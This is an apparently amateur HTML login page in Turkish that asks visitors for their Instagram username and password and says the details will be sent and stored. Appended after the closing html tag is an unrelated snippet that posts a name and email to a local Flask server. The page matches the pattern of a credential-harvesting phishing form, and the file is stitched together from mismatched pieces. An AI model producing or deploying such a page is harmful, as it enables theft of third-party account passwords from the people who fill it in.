<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kullanıcı Giriş Ekranı</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Giriş Ekranı</h1>
        <p>Lütfen bilgilerinizi girin. Bu bilgiler sizin izninizle kaydedilecektir.</p>
        <form id="loginForm">
            <label for="username">Instagram Kullanıcı Adınız</label>
            <input type="text" id="username" name="username" placeholder="Kullanıcı adınızı girin" required>
            
            <label for="password">Instagram Şifreniz</label>
            <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required>
            
            <div class="disclaimer">
                <input type="checkbox" id="consent" required>
                <label for="consent">Bilgilerimin gönderileceğini ve kaydedileceğini onaylıyorum.</label>
            </div>
            
            <button type="submit">Gönder</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
<script>
async function sendDataToFlask() {
    // Kullanıcıdan alınan veriler
    const data = {
        name: document.getElementById("name").value,
        email: document.getElementById("email").value
    };

    try {
        // Flask sunucusuna POST isteği gönder
        const response = await fetch('http://127.0.0.1:5000/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        // Sunucudan gelen cevabı al
        const result = await response.json();
        console.log("Sunucudan gelen cevap:", result);
        alert("Veri başarıyla gönderildi!");
    } catch (error) {
        console.error("Hata oluştu:", error);
        alert("Bir hata oluştu, lütfen tekrar deneyin.");
    }
}
</script>
<form>
    <label for="name">Adınız:</label>
    <input type="text" id="name" name="name"><br><br>
    <label for="email">E-posta:</label>
    <input type="email" id="email" name="email"><br><br>
    <button type="button" onclick="sendDataToFlask()">Gönder</button>
</form>
